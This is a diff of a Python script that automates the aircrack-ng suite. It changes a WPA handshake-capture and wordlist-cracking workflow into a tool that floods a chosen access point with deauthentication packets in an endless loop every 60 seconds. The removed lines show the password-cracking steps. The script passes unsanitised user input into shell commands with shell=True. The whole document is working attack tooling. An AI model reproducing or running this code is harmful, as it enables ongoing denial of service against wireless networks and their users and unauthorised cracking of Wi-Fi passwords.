@@ -1,6 +1,7 @@
 import subprocess
+import time
 
-print "Automation tool for air*-ng (WPA) suite by Zarkopafilis"
+print "Automation tool for air*-ng (deauth) suite by Zarkopafilis"
 print ""
 print "> ifconfig"
 out = subprocess.check_output("ifconfig")
@@ -24,19 +25,13 @@ subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , she
 bssid = raw_input("Enter BSSID > ")
 ssid = raw_input("Enter SSID > ")
 channel = raw_input("Enter channel > ")
-dumpFilePrefix = raw_input("Enter dump file prefix > ")
 x = raw_input("Start targeted airodump-ng > ")
-cmd = "airodump-ng -c " + channel + " --bssid " + bssid + " -w " + dumpFilePrefix + " " + interface
+cmd = "airodump-ng -c " + channel + " --bssid " + bssid + " " + interface
 print "> " + cmd
 subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
-packetCount = raw_input("Enter deauth packet count > ")
 x = raw_input("Start aireplay-ng targeted deauth > ")
-cmd = "aireplay-ng --deauth " + packetCount+ " -a " + bssid + " -e " + ssid + " " + interface
-print "> " + cmd
-subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
-dumpFile = raw_input("Enter dump file > ")
-wordlistFile = raw_input("Enter word list > ")
-cmd = "aircrack-ng -w " + wordlistFile + " -b " + bssid + " " + dumpFile
-x = raw_input("Start aircrack-ng when ready > ")
-print "> " + cmd
-subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
+cmd = "aireplay-ng --deauth 180 -x 3 -a " + bssid + " -e " + ssid + " " + interface
+print "> Run till interrupt > " + cmd
+while True:
+    subprocess.Popen(cmd , shell=True)
+    time.sleep(60)
